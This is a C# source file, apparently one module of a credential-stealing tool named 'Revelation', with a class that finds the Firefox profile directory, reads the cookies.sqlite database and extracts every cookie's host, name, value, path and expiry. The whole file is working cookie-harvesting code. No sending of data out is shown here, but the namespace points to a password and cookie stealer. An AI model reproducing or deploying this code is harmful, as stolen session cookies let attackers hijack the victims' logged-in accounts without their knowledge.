using Revelation.firefox.utils;
using Revelation.passwords.utils_firefox;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Revelation.passwords
{
    internal sealed class CookiesFirefox
    {
        // Get cookies from gecko browser
        public static List<Cookie> Get(string BrowserDir)
        {
            List<Cookie> lcCookies = new List<Cookie>();
            // Get firefox default profile directory
            string profile = Profile.GetProfile(BrowserDir);
            // Read cookies from file
            if (profile == null) return lcCookies;
            string db_location = Path.Combine(profile, "cookies.sqlite");
            // Read data from table
            SQLite sSQLite = SQLite.ReadTable(db_location, "moz_cookies");
            if (sSQLite == null) return lcCookies;
            // Get values from table
            for (int i = 0; i < sSQLite.GetRowCount(); i++)
            {
                Cookie cCookie = new Cookie();
                cCookie.hostname = sSQLite.GetValue(i, 4);
                cCookie.name = sSQLite.GetValue(i, 2);
                cCookie.value = sSQLite.GetValue(i, 3);
                cCookie.path = sSQLite.GetValue(i, 5);
                cCookie.expiresutc = sSQLite.GetValue(i, 6);

                lcCookies.Add(cCookie);
            }

            return lcCookies;
        }
    }
}
